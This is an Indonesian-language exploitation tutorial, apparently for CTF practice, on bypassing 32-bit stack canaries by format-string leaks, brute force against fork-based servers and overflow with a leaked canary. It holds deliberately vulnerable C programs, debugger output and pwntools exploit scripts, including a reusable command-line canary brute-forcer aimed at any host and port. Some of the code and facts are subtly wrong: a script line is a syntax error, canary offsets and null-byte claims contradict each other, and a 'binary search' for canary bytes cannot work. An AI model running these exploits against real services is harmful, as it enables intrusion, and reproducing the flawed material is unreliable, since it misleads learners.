---
title: Bypass Stack Canary - Pwn03
date: 2025-08-19
Tags: ["Pwn"]
---

### Apa itu Stack Canary?
Stack canary adalah mekanisme keamanan yang ditempatkan di stack untuk mendeteksi buffer overflow. Namanya berasal dari analogi "canary in a coal mine" - jika canary mati, ada bahaya.

### Cara Kerja:
1. **Setup**: Saat fungsi dipanggil, nilai random (canary) ditempatkan di stack antara buffer dan return address
2. **Verification**: Sebelum fungsi kembali, nilai canary diperiksa
3. **Detection**: Jika nilai berubah, program terminate dengan segfault

### Layout Stack dengan Canary:
```
High Addresses
+-----------------+
| Return Address  |
+-----------------+
| Saved EBP       |
+-----------------+
| Stack Canary    | ← Canary ditempatkan di sini
+-----------------+
| Local Variables |
| (termasuk buffer)|
+-----------------+
Low Addresses
```

## 2. Tools dan Analisis

### Tools yang Digunakan:
- **GDB dengan Pwndbg**: Debugger dengan enhancement untuk exploit development
- **Pwntools**: Python library untuk CTF exploits
- **Checksec**: Untuk melihat proteksi binary
- **Objdump**: Untuk melihat assembly code

### Contoh Output Pwndbg:

```bash
$ gdb ./vulnerable_program
pwndbg> checksec
[*] '/home/user/vulnerable_program'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

```
pwndbg> disassemble vulnerable_function
Dump of assembler code for function vulnerable_function:
   0x080484db <+0>:     push   ebp
   0x080484dc <+1>:     mov    ebp,esp
   0x080484de <+3>:     sub    esp,0x28
   0x080484e1 <+6>:     mov    eax,gs:0x14
   0x080484e7 <+12>:    mov    DWORD PTR [ebp-0xc],eax  ; Canary disimpan di [ebp-0xc]
   0x080484ea <+15>:    xor    eax,eax
   0x080484ec <+17>:    sub    esp,0x4
   0x080484ef <+20>:    push   0x100
   0x080484f4 <+25>:    lea    eax,[ebp-0x2c]
   0x080484f7 <+28>:    push   eax
   0x080484f8 <+29>:    push   0x0
   0x080484fa <+31>:    call   0x80483a0 <read@plt>
   0x080484ff <+36>:    add    esp,0x10
   0x08048502 <+39>:    mov    eax,DWORD PTR [ebp-0xc]
   0x08048505 <+42>:    xor    eax,gs:0x14
   0x0804850c <+49>:    je     0x8048513 <vulnerable_function+56>
   0x0804850e <+51>:    call   0x80483c0 <__stack_chk_fail@plt>
   0x08048513 <+56>:    leave  
   0x08048514 <+57>:    ret    
End of assembler dump.
```

**Yang perlu dipahami dari output:**
- `mov eax,gs:0x14` - Mengambil canary dari Thread Local Storage
- `mov DWORD PTR [ebp-0xc],eax` - Menyimpan canary di stack
- `xor eax,gs:0x14` - Memverifikasi canary sebelum return
- `je 0x8048513` - Jump jika canary valid
- `call __stack_chk_fail@plt` - Terminate program jika canary corrupt

# 3. Metode Bypass Canary 32-bit

# A. Format String Exploit untuk Leak Canary

Format string vulnerability terjadi ketika programmer menggunakan fungsi printf-style (printf, sprintf, fprintf, dll.) dengan parameter yang tidak terkontrol, memungkinkan attacker membaca dan menulis memory secara arbitrary.

### Fungsi Vulnerable:
```c
// VULNERABLE - user mengontrol format string
printf(user_input);

// AMAN - format string dikontrol programmer
printf("%s", user_input);
```

### Mengapa Format String Bisa Membaca Memory?
Pada implementasi C, fungsi printf membaca parameter dari stack sesuai dengan specifier yang diberikan:
- `%x` - membaca 4 byte dari stack sebagai hexadecimal
- `%p` - membaca pointer dari stack
- `%s` - membaca string dari alamat yang ada di stack
- `%n` - menulis jumlah byte yang telah di-output ke alamat yang ada di stack

## 2. Teori Leak Canary via Format String

### Layout Stack saat printf Dipanggil:
```
+-----------------+
| ...             |
+-----------------+
| Format String   | ← Alamat format string (biasanya di stack juga)
+-----------------+
| Arg1            | ← Parameter pertama untuk format specifier
+-----------------+
| Arg2            | ← Parameter kedua
+-----------------+
| ...             |
+-----------------+
| Canary Value    | ← Nilai canary yang ingin kita leak
+-----------------+
| ...             |
+-----------------+
```

### Cara Kerja Leak:
1. Ketika kita mengirim `%n$p`, printf akan membaca nilai ke-n dari stack
2. Canary biasanya berada di posisi tertentu di stack
3. Dengan mencoba offset berbeda, kita bisa menemukan posisi canary

## 3. Metodologi Lengkap Leak Canary

### Langkah 1: Identifikasi Vulnerability
Cari code pattern seperti:
```c
printf(input);  // Langsung tanpa format string
printf(buf);    // Buffer mungkin mengandung user input
```

### Langkah 2: Fuzzing Offset
Kirim payload seperti `AAAA.%1$p.%2$p.%3$p...` untuk memetakan stack:

```python
from pwn import *

p = process('./vulnerable')

# Fuzz offset
for i in range(1, 20):
    p.sendline(f'%{i}$p'.encode())
    response = p.recvline()
    print(f"Offset {i}: {response}")
    p.clean()
```

### Langkah 3: Identifikasi Canary
Canary biasanya memiliki karakteristik:
- Nilai berubah setiap run (karena random)
- Byte terakhir biasanya `\x00` (null byte untuk mencegah string overflow)
- Format hexadecimal yang valid

**Contoh output fuzzing:**
```
Offset 1: 0x41414141  // AAAA kita
Offset 2: 0xf7fa5000  // Libc address
Offset 3: 0x8048520   // Code address
Offset 4: (nil)       // Null pointer
Offset 5: 0xff8f7a44  // Stack address
Offset 6: 0xefbe37a0  // Kemungkinan canary (random, berakhir 00)
Offset 7: 0x1         // 
Offset 8: 0xff8f7b14  // 
```

### Langkah 4: Konfirmasi Canary
Verifikasi dengan mengirim payload yang specifically target suspected canary offset:

```python
p.sendline(b'%6$p')  # Coba offset 6
response = p.recvline()
canary_candidate = int(response.strip(), 16)

# Cek karakteristik canary
if canary_candidate & 0xff == 0x00:  # Byte terakhir null
    print(f"Potential canary found: 0x{canary_candidate:08x}")
```

## 4. Implementasi Exploit Lengkap

### Contoh Program Vulnerable:
```c
#include <stdio.h>
#include <unistd.h>

void vuln() {
    char buf[64];
    printf("Enter your name: ");
    read(0, buf, 100);  // Buffer overflow here
    
    printf("Hello, "); 
    printf(buf);  // Format string vulnerability here
    printf("\n");
    
    printf("Enter your message: ");
    read(0, buf, 200);  // Second buffer overflow
}

int main() {
    vuln();
    return 0;
}
```

### Eksploitasi Step-by-Step:

```python
from pwn import *

# Context setting
context(arch='i386', os='linux')
context.log_level = 'debug'  # Untuk output verbose

# Start process
p = process('./vulnerable_program')

# [STEP 1] Bypass prompt pertama
p.recvuntil("Enter your name: ")

# [STEP 2] Kirim format string untuk leak canary
# Setelah fuzzing, kita tahu canary ada di offset 7
p.sendline('%7$p')

# [STEP 3] Parse leaked canary
p.recvuntil("Hello, ")
leak = p.recvline().strip()
canary = int(leak, 16)
log.success(f"Leaked canary: 0x{canary:08x}")

# [STEP 4] Konfirmasi karakteristik canary
if canary & 0xff != 0x00:
    log.warning("This might not be a canary (no null byte)")
    # Mungkin perlu coba offset lain

# [STEP 5] Bypass prompt kedua
p.recvuntil("Enter your message: ")

# [STEP 6] Bangun payload dengan canary yang valid
# Hitung offset berdasarkan analisis binary
offset = 64  # Size buffer
padding = 8  # EBP yang disimpan

payload = b'A' * offset      # Isi buffer
payload += p32(canary)       Canary yang valid
payload += b'B' * padding    # Overwrite EBP
payload += p32(0xdeadbeef)   # Return address

# [STEP 7] Kirim payload
p.sendline(payload)

# [STEP 8] Interact dengan shell
p.interactive()
```

## 5. Analisis Assembly dan Debugging

### Disassembly Fungsi Vulnerable:
```assembly
080484db <vuln>:
 80484db:       55                      push   ebp
 80484dc:       89 e5                   mov    ebp,esp
 80484de:       83 ec 48                sub    esp,0x48
 80484e1:       65 a1 14 00 00 00       mov    eax,gs:0x14
 80484e7:       89 45 f4                mov    DWORD PTR [ebp-0xc],eax  ; Simpan canary
 80484ea:       31 c0                   xor    eax,eax
 80484ec:       83 ec 0c                sub    esp,0xc
 80484ef:       68 90 85 04 08          push   0x8048590                ; "Enter your name: "
 80484f4:       e8 87 fe ff ff          call   8048380 <printf@plt>
 80484f9:       83 c4 10                add    esp,0x10
 80484fc:       83 ec 04                sub    esp,0x4
 80484ff:       6a 64                   push   0x64                     ; 100 bytes
 8048501:       8d 45 b4                lea    eax,[ebp-0x4c]           ; Buffer di ebp-0x4c
 8048504:       50                      push   eax
 8048505:       6a 00                   push   0x0
 8048507:       e8 a4 fe ff ff          call   80483b0 <read@plt>
 804850c:       83 c4 10                add    esp,0x10
 804850f:       83 ec 0c                sub    esp,0xc
 8048512:       68 a2 85 04 08          push   0x80485a2                ; "Hello, "
 8048517:       e8 64 fe ff ff          call   8048380 <printf@plt>
 804851c:       83 c4 10                add    esp,0x10
 804851f:       83 ec 0c                sub    esp,0xc
 8048522:       8d 45 b4                lea    eax,[ebp-0x4c]           ; Buffer vulnerable!
 8048525:       50                      push   eax
 8048526:       e8 55 fe ff ff          call   8048380 <printf@plt>     ; Format string vuln
 804852b:       83 c4 10                add    esp,0x10
 804852e:       83 ec 0c                sub    esp,0xc
 8048531:       6a 0a                   push   0xa                      ; "\n"
 8048533:       e8 68 fe ff ff          call   80483a0 <putchar@plt>
 8048538:       83 c4 10                add    esp,0x10
 804853b:       83 ec 0c                sub    esp,0xc
 804853e:       68 a9 85 04 08          push   0x80485a9                ; "Enter your message: "
 8048543:       e8 38 fe ff ff          call   8048380 <printf@plt>
 8048548:       83 c4 10                add    esp,0x10
 804854b:       83 ec 04                sub    esp,0x4
 804854e:       68 c8 00 00 00          push   0xc8                     ; 200 bytes
 8048553:       8d 45 b4                lea    eax,[ebp-0x4c]           ; Buffer overflow
 8048556:       50                      push   eax
 8048557:       6a 00                   push   0x0
 8048559:       e8 52 fe ff ff          call   80483b0 <read@plt>
 804855e:       83 c4 10                add    esp,0x10
 8048561:       8b 45 f4                mov    eax,DWORD PTR [ebp-0xc]  ; Load canary
 8048564:       65 33 05 14 00 00 00    xor    eax,gs:0x14
 804856b:       74 05                   je     8048572 <vuln+0x97>
 804856d:       e8 3e fe ff ff          call   80483b0 <__stack_chk_fail@plt>
 8048572:       8b 4d fc                mov    ecx,DWORD PTR [ebp-0x4]
 8048575:       c9                      leave  
 8048576:       8d 61 fc                lea    esp,[ecx-0x4]
 8048579:       c3                      ret
```

### Analisis Debugging dengan PWNDBG:

```bash
# Start debugging
gdb ./vulnerable_program
pwndbg> break *0x8048526  # Break sebelum printf vulnerable
pwndbg> r

# Saat breakpoint hit, periksa stack
pwndbg> telescope 20
00:0000│ esp 0xffffd500 —▸ 0xffffd52c ◂— 'AAAA.%7$p'
01:0004│     0xffffd504 ◂— 0x0
02:0008│     0xffffd508 ◂— 0xf7fa5000
03:000c│     0xffffd50c ◂— 0x8048520
04:0010│     0xffffd510 ◂— 0x0
05:0014│     0xffffd514 ◂— 0xff8f7a44
06:0018│     0xffffd518 ◂— 0xefbe37a0  # Canary candidate
07:001c│     0xffffd51c ◂— 0x1
08:0020│     0xffffd520 ◂— 0xff8f7b14

# Verifikasi canary
pwndbg> x/xw $ebp-0xc
0xffffd51c:     0xefbe37a0  # Match dengan offset 7

# Lanjut execution
pwndbg> ni
# Program akan mencetak "Hello, 0xefbe37a0"
```

## 6. Advanced Techniques dan Edge Cases

### Multiple Format String Exploits:
Jika ada multiple format string vulnerabilities, kita bisa gunakan yang pertama untuk leak canary dan yang kedua untuk write exploit.

### Partial Overwrite dengan %n:
Kita bisa gunakan `%n` untuk menulis nilai ke memory, tapi perlu hati-hati karena bisa merusak canary.

### Bypass ASLR dengan Format String:
Selain leak canary, format string bisa digunakan untuk leak alamat libc, heap, atau stack untuk bypass ASLR.

### Automating dengan Pwntools:
```python
# Automated canary finding
def find_canary_offset():
    for i in range(1, 30):
        p = process('./vulnerable')
        p.recvuntil("name: ")
        p.sendline(f'%{i}$p'.encode())
        p.recvuntil("Hello, ")
        leak = p.recvline().strip()
        try:
            value = int(leak, 16)
            if value & 0xff == 0x00:  # Null byte characteristic
                log.info(f"Potential canary at offset {i}: 0x{value:08x}")
                # Verify by checking if it changes between runs
                p.close()
                return i
        except:
            pass
        p.close()
    return None
```

## 7. Mitigation dan Countermeasures

### Cara Mencegah Format String Vulnerability:
1. Selalu gunakan format string literal: `printf("%s", user_input)`
2. Gunakan functions yang lebih aman seperti `snprintf`
3. Implementasi stack canaries dengan nilai yang sangat random
4. Gunakan compile-time protections seperti `-D_FORTIFY_SOURCE=2`

### Deteksi dengan Static Analysis:
Tools seperti Coverity, Checkmarx, atau Semgrep bisa detect pattern vulnerable seperti `printf(user_input)`.


# B. Brute Force (Untuk Fork-based Server)


Fork-based server adalah server yang menggunakan system call `fork()` untuk menangani setiap koneksi client secara terpisah. Setiap koneksi baru dibuat dalam proses child yang merupakan duplikat dari proses parent.

### Copy-on-Write (CoW) Mechanism:
- Pada sistem modern, `fork()` menggunakan teknik Copy-on-Write
- Memory pages dibagi antara parent dan child sampai salah satu proses mencoba menulis
- Canary yang di-generate oleh parent akan diwarisi oleh semua child processes
- Karena canary tidak diubah setelah fork, nilainya tetap sama across connections

### Mengapa Brute Force Mungkin?
- **Deterministic**: Canary sama untuk setiap koneksi baru
- **Byte-by-byte**: Kita bisa menebak canary satu byte per satu byte
- **Feedback**: Server akan crash jika canary salah, tetap hidup jika benar
- **256 possibilities per byte**: Hanya 256 kemungkinan per byte (feasible)

## 2. Arsitektur Fork-based Server Vulnerable

### Contoh Server Code:
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

void handle_client(int sock) {
    char buffer[64];
    
    // Baca input dari client
    read(sock, buffer, 128);  // Buffer overflow vulnerability
    
    // Process client request
    write(sock, "Response", 8);
}

int main() {
    int server_fd, client_sock;
    struct sockaddr_in address;
    int opt = 1;
    int addrlen = sizeof(address);

    // Create socket
    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(1234);
    
    bind(server_fd, (struct sockaddr*)&address, sizeof(address));
    listen(server_fd, 3);
    
    while(1) {
        client_sock = accept(server_fd, (struct sockaddr*)&address, (socklen_t*)&addrlen);
        
        // Fork untuk handle client baru
        if (fork() == 0) {
            close(server_fd);
            handle_client(client_sock);
            exit(0);
        }
        close(client_sock);
    }
    
    return 0;
}
```

## 3. Metodologi Brute Force Lengkap

### Phase 1: Reconnaissance
```python
from pwn import *
import time

# Tentukan offset ke canary
def find_canary_offset():
    # Gunakan pattern create/analyze atau manual calculation
    # Berdasarkan analisis binary
    return 64  # Contoh: canary berada setelah 64 bytes buffer

offset = find_canary_offset()
```

### Phase 2: Byte-by-byte Bruteforce

```python
def brute_force_canary(host, port, offset):
    canary = b''
    found_byte = False
    
    # Bruteforce 4 bytes (32-bit canary)
    for byte_num in range(4):
        found_byte = False
        for byte_val in range(256):
            # Buat koneksi baru
            conn = remote(host, port)
            
            # Bangun payload
            payload = b'A' * offset  # Isi buffer
            payload += canary        # Bytes canary yang sudah diketahui
            payload += bytes([byte_val])  # Byte yang sedang di-test
            
            # Kirim payload
            try:
                conn.send(payload)
                
                # Coba baca response
                try:
                    response = conn.recv(timeout=2)
                    # Jika dapat response, byte benar
                    canary += bytes([byte_val])
                    log.success(f"Found byte {byte_num}: 0x{byte_val:02x}")
                    log.info(f"Current canary: 0x{canary.hex()}")
                    found_byte = True
                    conn.close()
                    break
                    
                except EOFError:
                    # Connection closed - byte salah
                    conn.close()
                    continue
                    
            except Exception as e:
                log.warning(f"Error: {e}")
                conn.close()
                continue
        
        if not found_byte:
            log.error(f"Failed to find byte {byte_num}")
            return None
    
    return canary
```

### Phase 3: Verification
```python
def verify_canary(host, port, offset, canary):
    # Test canary yang ditemukan
    conn = remote(host, port)
    
    payload = b'A' * offset
    payload += canary
    payload += b'B' * 12  # Padding
    payload += b'C' * 4   # Return address dummy
    
    conn.send(payload)
    
    try:
        response = conn.recv(timeout=2)
        log.success("Canary verified successfully!")
        return True
    except:
        log.error("Canary verification failed")
        return False
```

## 4. Implementasi Robust dengan Error Handling

```python
from pwn import *
import time

class CanaryBruteforcer:
    def __init__(self, host, port, offset, timeout=2, max_retries=3):
        self.host = host
        self.port = port
        self.offset = offset
        self.timeout = timeout
        self.max_retries = max_retries
        self.canary = b''
        
    def test_byte(self, candidate):
        """Test satu byte candidate"""
        for attempt in range(self.max_retries):
            try:
                conn = remote(self.host, self.port)
                payload = b'A' * self.offset
                payload += self.canary
                payload += bytes([candidate])
                
                conn.send(payload)
                
                # Tunggu response
                try:
                    response = conn.recv(timeout=self.timeout)
                    conn.close()
                    return True
                except EOFError:
                    conn.close()
                    return False
                except Exception:
                    conn.close()
                    continue
                    
            except Exception as e:
                log.warning(f"Connection error: {e}")
                time.sleep(0.1)
                continue
        
        return False
    
    def brute_force(self):
        """Main bruteforce routine"""
        start_time = time.time()
        
        for byte_num in range(4):
            found = False
            
            # Progress bar untuk current byte
            for byte_val in range(256):
                if self.test_byte(byte_val):
                    self.canary += bytes([byte_val])
                    elapsed = time.time() - start_time
                    log.success(f"Byte {byte_num}: 0x{byte_val:02x} "
                              f"(Time: {elapsed:.2f}s, Canary: 0x{self.canary.hex()})")
                    found = True
                    break
            
            if not found:
                log.error(f"Failed to find byte {byte_num}")
                return None
        
        total_time = time.time() - start_time
        log.success(f"Full canary found: 0x{self.canary.hex()} in {total_time:.2f} seconds")
        return self.canary

# Usage
bruteforcer = CanaryBruteforcer('localhost', 1234, offset=64)
canary = bruteforcer.brute_force()
```

## 5. Analisis Kecepatan dan Optimasi

### Time Estimation:
- **Worst-case**: 4 bytes × 256 attempts × 2 seconds = ~34 menit
- **Average-case**: 4 bytes × 128 attempts × 2 seconds = ~17 menit
- **Best-case**: 4 bytes × 1 attempt × 2 seconds = ~8 detik

### Optimasi Techniques:

**1. Parallel Connections:**
```python
from concurrent.futures import ThreadPoolExecutor, as_completed

def parallel_brute_force(self):
    """Bruteforce dengan parallel connections"""
    with ThreadPoolExecutor(max_workers=10) as executor:
        for byte_num in range(4):
            futures = {}
            
            # Test semua byte values secara parallel
            for byte_val in range(256):
                future = executor.submit(self.test_byte, byte_val)
                futures[future] = byte_val
            
            # Process results
            for future in as_completed(futures):
                byte_val = futures[future]
                if future.result():
                    self.canary += bytes([byte_val])
                    break
```

**2. Binary Search Approach** (jika possible):
```python
def binary_search_byte(self, byte_num):
    """Binary search untuk menemukan byte yang benar"""
    low = 0
    high = 255
    
    while low <= high:
        mid = (low + high) // 2
        if self.test_byte(mid):
            # Jika mid benar, cari yang lebih tinggi
            low = mid + 1
        else:
            # Jika mid salah, cari yang lebih rendah
            high = mid - 1
    
    return low - 1  # Return last successful byte
```

**3. Adaptive Timeout:**
```python
def adaptive_test_byte(self, candidate):
    """Timeout adaptive berdasarkan response time"""
    start_time = time.time()
    result = self.test_byte(candidate)
    response_time = time.time() - start_time
    
    # Jika response cepat, kemungkinan besar benar
    if response_time < 0.5:
        return True
    else:
        return result
```

## 6. Real-world Example dan Debugging

### Contoh Output Bruteforce:
```
[+] Starting local process './vulnerable_server': pid 1234
[∗] Bruteforcing canary...
[+] Byte 0: 0x00 (Time: 2.1s, Canary: 0x00)
[+] Byte 1: 0xde (Time: 130.5s, Canary: 0x00de)
[+] Byte 2: 0xad (Time: 258.3s, Canary: 0x00dead)
[+] Byte 3: 0xbe (Time: 387.1s, Canary: 0x00deadbe)
[+] Full canary found: 0x00deadbe in 387.1 seconds
```

### Debugging Tips:
```python
# Enable debug logging
context.log_level = 'debug'

# Tambahkan timeout handling
context.timeout = 2

# Gunakan signal handling untuk connection errors
import signal
signal.signal(signal.SIGALRM, timeout_handler)
```

## 7. Advanced Techniques

### Bypass Canary dengan Partial Overwrite:
Jika kita sudah tahu beberapa byte canary (melalui info leak), kita bisa mengurangi waktu bruteforce.

```python
def partial_bruteforce(self, known_bytes):
    """Bruteforce hanya bytes yang tidak diketahui"""
    self.canary = known_bytes
    remaining_bytes = 4 - len(known_bytes)
    
    for byte_num in range(remaining_bytes):
        # ... same as before
```

### Heap Spraying Alternative:
Untuk beberapa implementasi, canary mungkin diambil dari nilai tertentu yang bisa diprediksi.

### Timing Attacks:
Menggunakan perbedaan waktu response untuk menentukan byte yang benar.

## 8. Mitigation dan Countermeasures

### Cara Mencegah Bruteforce Attack:
1. **Canary Randomization**: Generate canary baru setelah fork
2. **Connection Limits**: Limit koneksi per IP address
3. **Rate Limiting**: Tambahkan delay antara koneksi
4. **Canary Protection**: Gunakan canary yang lebih kompleks

### Implementasi Secure:
```c
// Generate canary setelah fork
void __attribute__((constructor)) generate_canary() {
    // Baca dari /dev/urandom untuk canary yang lebih secure
    int fd = open("/dev/urandom", O_RDONLY);
    read(fd, &global_canary, sizeof(global_canary));
    close(fd);
}
```

## 9. Tools dan Automation

### Automated Bruteforce Script:
```python
#!/usr/bin/env python3
import argparse
from pwn import *

def main():
    parser = argparse.ArgumentParser(description='Canary bruteforce tool')
    parser.add_argument('host', help='Target host')
    parser.add_argument('port', type=int, help='Target port')
    parser.add_argument('offset', type=int, help='Offset to canary')
    parser.add_argument('--timeout', type=float, default=2, help='Timeout per attempt')
    parser.add_argument('--workers', type=int, default=1, help='Number of parallel workers')
    
    args = parser.parse_args()
    
    bruteforcer = CanaryBruteforcer(
        args.host, 
        args.port, 
        args.offset,
        timeout=args.timeout
    )
    
    canary = bruteforcer.brute_force()
    
    if canary:
        print(f"Success! Canary: 0x{canary.hex()}")
    else:
        print("Bruteforce failed")

if __name__ == '__main__':
    main()
```



### C. Partial Overwrite (Jika Ada Info Leak)

### Mengapa Partial Overwrite Mungkin?
Ketika program memiliki vulnerability information leak (seperti format string bug), penyerang dapat:
1. Membaca nilai canary dari memory
2. Merekonstruksi canary yang valid
3. Membuat payload yang mempertahankan canary asli
4. Meng-overwrite hanya bagian setelah canary

### Alur Eksploitasi
1. **Leak Information**: Dapatkan alamat buffer atau nilai canary
2. **Reconstruct Canary**: Gunakan informasi yang dibocorkan
3. **Craft Payload**: Buat payload yang mempertahankan canary valid
4. **Hijack Control Flow**: Overwrite return address atau fungsi pointer

### Tantangan dalam Partial Overwrite
- Canary yang randomized membutuhkan leak untuk setiap eksekusi
- Format string exploitation membutuhkan pemahaman layout stack
- Ukuran buffer yang terbatas mempersulit payload complex

## Analisis Program Vulnerable

### Kode Sumber Vulnerable
```c
#include <stdio.h>
#include <unistd.h>

void vulnerable() {
    char buffer[40];
    printf("Buffer is at %p\n", buffer);
    read(0, buffer, 100);
    printf("Hello, %s\n", buffer);
}

int main() {
    vulnerable();
    return 0;
}
```

### Kompilasi dengan Proteksi
```bash
gcc -m32 -fstack-protector vuln.c -o vuln
```

### Analisis Assembly Mendalam

Dengan menggunakan `objdump -d -M intel vuln`, kita dapat menganalisis fungsi `vulnerable`:

```nasm
080484db <vulnerable>:
 80484db:       55                      push   ebp
 80484dc:       89 e5                   mov    ebp,esp
 80484de:       83 ec 38                sub    esp,0x38        ; Alokasi 56 byte di stack
 80484e1:       65 a1 14 00 00 00       mov    eax,gs:0x14     ; Load canary dari TLS
 80484e7:       89 45 f4                mov    DWORD PTR [ebp-0xc],eax  ; Simpan canary di stack
 80484ea:       31 c0                   xor    eax,eax         ; Clear eax
 80484ec:       8d 45 d4                lea    eax,[ebp-0x2c]  ; Load address buffer
 80484ef:       89 04 24                mov    DWORD PTR [esp],eax
 80484f2:       e8 a9 fe ff ff          call   80483a0 <printf@plt>  ; Print buffer address
 80484f7:       c7 44 24 08 64 00 00    mov    DWORD PTR [esp+0x8],0x64  ; Argumen read: 100 byte
 80484fe:       00 
 80484ff:       8d 45 d4                lea    eax,[ebp-0x2c]  ; Buffer address
 8048502:       89 44 24 04             mov    DWORD PTR [esp+0x4],eax
 8048506:       c7 04 24 00 00 00 00    mov    DWORD PTR [esp],0x0  ; stdin
 804850d:       e8 8e fe ff ff          call   80483a0 <read@plt>  ; Vulnerable read
 8048512:       8d 45 d4                lea    eax,[ebp-0x2c]  ; Buffer address
 8048515:       89 04 24                mov    DWORD PTR [esp],eax
 8048518:       e8 73 fe ff ff          call   8048390 <printf@plt>  ; Print buffer content
 804851d:       8b 45 f4                mov    eax,DWORD PTR [ebp-0xc]  ; Load canary dari stack
 8048520:       65 33 05 14 00 00 00    xor    eax,gs:0x14     ; Bandingkan dengan canary asli
 8048527:       74 05                   je     804852e <vulnerable+0x53>  ; Jika sama, lanjut
 8048529:       e8 92 fe ff ff          call   80483c0 <__stack_chk_fail@plt>  ; Jika beda, abort
 804852e:       c9                      leave  
 804852f:       c3                      ret    
```

### Layout Stack yang Terperinci

Dari analisis assembly, kita dapat menentukan layout stack yang tepat:

| Alamat Relatif | Ukuran | Konten                     |
|----------------|--------|----------------------------|
| ebp-0x2c       | 40     | buffer[40]                 |
| ebp-0x2c+40    | 8      | Padding (alignment)        |
| ebp-0xc        | 4      | Stack Canary               |
| ebp-0x8        | 4      | Saved EBP                  |
| ebp-0x4        | 4      | Return Address             |

**Perhitungan yang Penting:**
- Buffer dimulai di `ebp-0x2c` (44 byte dari ebp)
- Canary berada di `ebp-0xc` (12 byte dari ebp)
- Jarak dari buffer ke canary: 44 - 12 = 32 byte
- Setelah canary, ada 8 byte (saved ebp) sebelum return address

## Praktek Eksploitasi Langkah demi Langkah

### Eksploitasi dengan Format String Leak

```python
from pwn import *

# Setup context untuk architecture dan OS
context(arch='i386', os='linux')

# Jalankan program vulnerable
p = process('./vuln')

# Langkah 1: Dapatkan alamat buffer dari output
p.recvuntil('at ')
buffer_addr = int(p.recvline().strip(), 16)
log.info("Buffer address: 0x%x" % buffer_addr)

# Langkah 2: Gunakan format string untuk leak canary
# Dalam arsitektur 32-bit, parameter format string biasanya mulai dari [esp+4]
# Kita perlu menemukan offset yang tepat untuk canary
p.sendline('%7$p')  # Coba offset 7 (mungkin perlu disesuaikan)

# Langkah 3: Parse output untuk mendapatkan canary
output = p.recvuntil('Hello,')
canary_str = output.split(b'Hello,')[0].strip()
try:
    canary = int(canary_str, 16)
    log.info("Leaked canary: 0x%x" % canary)
except:
    log.error("Failed to leak canary. Try different offset.")
    # Coba offset lain secara brute force
    for i in range(1, 20):
        p = process('./vuln')
        p.recvuntil('at ')
        p.sendline('%' + str(i) + '$p')
        output = p.recvuntil('Hello,')
        val = output.split(b'Hello,')[0].strip()
        log.info("Offset %d: %s" % (i, val))
        p.close()
    exit(1)

# Langkah 4: Siapkan payload dengan canary yang valid
offset = 32  # Jarak dari buffer ke canary
payload = b'A' * offset      # Mengisi sampai tepat sebelum canary
payload += p32(canary)       # Canary yang valid (tidak diubah)
payload += b'B' * 8          # Mengisi saved EBP dan padding
payload += p32(0xdeadbeef)   # Return address yang ingin kita overwrite

# Langkah 5: Kirim payload
p.sendline(payload)

# Langkah 6: Interact dengan shell jika berhasil
p.interactive()
```

### Penjelasan Detail Eksploitasi

1. **Leak Canary dengan Format String**:
   - Format string `%7$p` akan membaca nilai ke-7 dari stack
   - Nilai ini kemungkinan adalah canary karena posisinya di stack
   - Canary biasanya dikenali karena diawali null byte (0x00)

2. **Crafting Payload**:
   - 32 byte pertama: Mengisi buffer tanpa mengubah canary
   - 4 byte berikutnya: Canary asli yang telah kita leak
   - 8 byte berikutnya: Mengisi saved EBP (bisa apa saja)
   - 4 byte terakhir: Return address yang kita kontrol

3. **Mengatasi Randomization**:
   - Canary berbeda setiap eksekusi, jadi harus di-leak setiap kali
   - Jika offset format string tidak tepat, perlu brute force

## Debugging Mendalam dengan Pwndbg

### Memahami Proses Debugging

Debugging adalah kunci untuk memahami dan mengeksploitasi vulnerability. Berikut langkah-langkah detail dengan Pwndbg:

#### 1. Menjalankan Program dengan Input Test
```bash
# Crash program tanpa canary yang valid
pwndbg> r <<< $(python -c "print 'A'*44 + 'B'*4 + 'C'*8 + 'D'*4")
# Program akan crash di __stack_chk_fail
```

#### 2. Memeriksa Nilai Canary di Stack
```bash
pwndbg> x/xw $ebp-0xc  # Lihat nilai canary di stack
0xffffd00c:     0x41414141   # Terlihat canary telah ter-overwrite dengan 'AAAA'
```

#### 3. Mencari Offset Format String yang Tepat
```bash
pwndbg> r <<< $(python -c "print '%7$p'")
# Perhatikan output, cari nilai yang looks like canary (biasanya diawali null byte)
```

#### 4. Step-by-Step Execution
```bash
pwndbg> b *0x804851d    # Breakpoint sebelum canary check
pwndbg> r
pwndbg> ni              # Step through instruction
# Perhatikan nilai register dan stack saat canary verification
```

#### 5. Memverifikasi Canary yang Dileak
```bash
# Setelah mendapatkan canary melalui format string
pwndbg> p/x 0xefbeadde  # Ganti dengan nilai yang dileak
$1 = 0xefbeadde
pwndbg> x/xw $ebp-0xc   # Bandingkan dengan nilai di stack
0xffffd00c:     0xefbeadde
```

#### 6. Testing Payload Final
```bash
# Dengan canary yang valid
pwndbg> r <<< $(python -c "print 'A'*32 + '\xde\xad\xbe\xef' + 'B'*8 + '\xef\xbe\xad\xde'")
# Program tidak akan crash di __stack_chk_fail tapi di 0xdeadbeef
```

### Analisis Register dan Memory Selama Debugging

Selama proses debugging, perhatikan register dan memory berikut:

1. **EAX**: Berisi nilai canary yang di-load dari stack
2. **GS:0x14**: Berisi nilai canary asli dari Thread Local Storage
3. **EBP-0xc**: Alamat canary di stack
4. **Stack setelah canary**: Berisi saved EBP dan return address

## 5. Tips dan Strategi CTF

1. **Identifikasi Vulnerability Type**: Format string, buffer overflow, dll.
2. **Check Protections**: Gunakan checksec untuk melihat ada canary atau tidak.
3. **Cara Dapat Canary**:
   - Format string leak
   - Output yang menampilkan nilai stack
   - Brute force (jika fork server)
4. **Hitung Offset dengan Akurat**: Gunakan pattern create/pattern offset dalam pwntools.
5. **Pastikan Endianness**: 32-bit little endian biasanya.

## 6. Advanced Techniques

### Bypass EXIT-based Canary Protection:
Beberapa implementasi hanya memeriksa canary jika fungsi menggunakan `return`, tetapi tidak jika menggunakan `exit()` atau `longjmp()`.

### Overwrite Stack Pointer:
Alih-alih mengembalikan ke shellcode, arahkan stack pointer ke area yang bisa dikontrol.

